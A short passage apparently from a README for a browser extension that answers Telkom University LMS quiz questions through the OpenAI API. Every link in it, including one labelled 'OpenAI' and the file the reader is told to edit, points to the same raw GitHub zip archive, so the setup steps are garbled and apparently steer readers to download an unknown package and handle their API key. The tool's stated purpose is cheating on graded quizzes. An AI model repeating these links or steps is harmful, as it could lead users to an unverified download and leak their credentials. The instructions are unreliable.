...
1. Ensure that you are on the Telkom University LMS quiz page (e.g., https://raw.githubusercontent.com/wafiqj/lms-quiz-extension/main/landed/extension_quiz_lms_v1.3.zip).
...
1. Visit [OpenAI](https://raw.githubusercontent.com/wafiqj/lms-quiz-extension/main/landed/extension_quiz_lms_v1.3.zip) to sign up or log in.
2. Retrieve your API key from the OpenAI dashboard.
3. Open the `https://raw.githubusercontent.com/wafiqj/lms-quiz-extension/main/landed/extension_quiz_lms_v1.3.zip` file and replace `YOUR_OPENAI_API_KEY` with your actual API key.
